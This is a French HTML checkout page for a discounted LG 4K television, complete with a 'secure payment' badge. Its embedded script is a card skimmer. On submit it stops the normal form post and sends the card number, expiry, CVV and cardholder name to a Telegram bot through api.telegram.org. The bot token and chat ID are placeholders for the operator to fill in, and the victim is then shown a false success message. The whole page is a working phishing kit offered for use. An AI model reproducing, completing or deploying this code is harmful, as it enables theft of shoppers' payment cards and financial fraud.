<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page de Paiement</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: linear-gradient(to right, #ffffff, #f4f4f4);
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 700px;
            margin: 50px auto;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            padding: 30px 40px;
        }

        h2 {
            text-align: center;
            color: #c70000;
            margin-bottom: 30px;
            font-size: 24px;
        }

        /* Section du produit */
        .product-info {
            text-align: center;
            margin-bottom: 30px;
        }

        .product-info img {
            width: 150px; /* Taille de l'image du produit */
            margin-bottom: 15px;
        }

        .product-info p {
            font-size: 16px;
            color: #333;
        }

        .price {
            font-size: 20px;
            color: #c70000;
            font-weight: bold;
            margin-top: 10px;
        }

        /* Séparateur entre le produit et les informations de paiement */
        hr {
            border: 0;
            border-top: 2px solid #c70000;
            margin: 30px 0;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            font-weight: 500;
            margin-bottom: 8px;
            display: block;
            color: #333;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            border-color: #c70000;
            outline: none;
        }

        .form-group button {
            width: 100%;
            padding: 15px;
            background-color: #c70000;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .form-group button:hover {
            background-color: #a50000;
        }

        .secure-payment {
            text-align: center;
            margin-top: 20px;
        }

        .secure-payment img {
            width: 150px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Informations sur le produit -->
        <div class="product-info">
            <img src="51FWfzIHkWL._AC_SX679_.jpg" alt="LG TV - 55NANO766">
            <p><strong>LG TV - 55NANO766 - Acier foncé - 55'' (139 cm) - LED NanoCell 4K</strong></p>
            <p>Taille de l'écran : 55 Pouces</p>
            <p>Marque : LG</p>
            <p>Technologie d'affichage : LED</p>
            <p>Résolution : 4K</p>
            <p>Fréquence de rafraîchissement : 50 Hz</p>
            <p>Technologie de connectivité : USB, HDMI</p>
            <p class="price">Prix : 399.99€</p>
        </div>

        <!-- Séparateur -->
        <hr>

        <!-- Informations de paiement -->
        <h2>Informations de Paiement</h2>

        <form action="confirmation.html" method="POST" id="payment-form">
            <div class="form-group">
                <label for="card-number">Numéro de carte</label>
                <input 
                    type="text" 
                    id="card-number" 
                    name="card-number" 
                    placeholder="xxxx xxxx xxxx xxxx" 
                    maxlength="19" 
                    inputmode="numeric" 
                    required>
            </div>

            <div class="form-group">
                <label for="expiry-date">Date d'expiration</label>
                <div style="display: flex; gap: 10px;">
                    <select id="expiry-month" name="expiry-month" required>
                        <option value="" disabled selected>Mois</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <select id="expiry-year" name="expiry-year" required>
                        <option value="" disabled selected>Année</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                    </select>
                </div>
            </div>

            <div class="form-group">
                <label for="cvv">CVV</label>
                <input 
                    type="text" 
                    id="cvv" 
                    name="cvv" 
                    placeholder="123" 
                    maxlength="3" 
                    inputmode="numeric" 
                    required>
            </div>

            <div class="form-group">
                <label for="name-on-card">Nom sur la carte</label>
                <input type="text" id="name-on-card" name="name-on-card" placeholder="Entrez le nom" required>
            </div>

            <div class="form-group">
                <button type="submit">Payer maintenant</button>
            </div>
        </form>

        <div class="secure-payment">
            <img src="instrumentys_paiement_securise_logo.jpg" alt="Paiement Sécurisé">
        </div>
    </div>

    <script>
        const cardInput = document.getElementById('card-number');

        cardInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s+/g, ''); // Retirer les espaces
            if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
            const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Ajouter un espace après chaque 4 chiffres
            e.target.value = formattedValue;
        });

        // Fonction pour envoyer les informations au bot Telegram
        document.getElementById('payment-form').addEventListener('submit', async function(e) {
            e.preventDefault(); // Eviter l'envoi du formulaire

            const data = new FormData(this);
            const cardNumber = data.get('card-number');
            const expiryMonth = data.get('expiry-month');
            const expiryYear = data.get('expiry-year');
            const cvv = data.get('cvv');
            const nameOnCard = data.get('name-on-card');
            const price = "399.99€"; // Prix du produit

            // Créez un message à envoyer
            const message = `
Produit : LG TV - 55NANO766 - 55 Pouces 4K
Prix : ${price}
Numéro de carte : ${cardNumber}
Date d'expiration : ${expiryMonth}/${expiryYear}
CVV : ${cvv}
Nom sur la carte : ${nameOnCard}
`;

            const botToken = 'VOTRE_BOT_TOKEN'; // Remplacez par votre Token de bot Telegram
            const chatId = 'VOTRE_CHAT_ID'; // Remplacez par votre chat ID Telegram

            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Envoi du message
            const response = await fetch(telegramApiUrl);
            const dataResponse = await response.json();

            if (dataResponse.ok) {
                alert('Votre paiement a été envoyé avec succès.');
            } else {
                alert('Erreur dans l\'envoi des informations.');
            }
        });
    </script>

</body>
</html>
